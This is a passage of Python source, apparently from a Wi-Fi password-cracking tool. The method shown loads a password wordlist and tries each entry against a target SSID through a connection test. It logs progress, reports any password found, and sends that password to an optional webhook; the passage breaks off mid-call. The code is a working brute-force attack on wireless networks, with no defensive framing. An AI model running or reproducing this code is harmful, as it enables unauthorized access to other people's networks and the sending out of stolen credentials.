    def _brute_force_thread(self, ssid, wordlist_path):
        """REAL brute force"""
        try:
            with open(wordlist_path, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            self.total_passwords = len(passwords)
            self.output_queue.put(('log', f"📚 Loaded {self.total_passwords} passwords", 'info'))
            
            for i, password in enumerate(passwords):
                if self.stop_flag.is_set():
                    break
                
                self.tested_passwords += 1
                elapsed = time.time() - self.start_time
                progress = (i / self.total_passwords) * 100
                speed = self.tested_passwords / elapsed if elapsed > 0 else 0
                
                self.output_queue.put(('brute_progress', (progress, speed)))
                
                if i % 3 == 0:
                    self.output_queue.put(('log', f"Trying: {password} ({i+1}/{self.total_passwords})", 'info'))
                
                # REAL CONNECTION TEST
                if self.try_connect(ssid, password):
                    self.password_found = True
                    self.output_queue.put(('log', f"🎉 PASSWORD FOUND: {password}", 'found'))
                    
                    if self.webhook_enabled:
                        self.send_webhook(
                            "🔓 PASSWORD FOUND!",
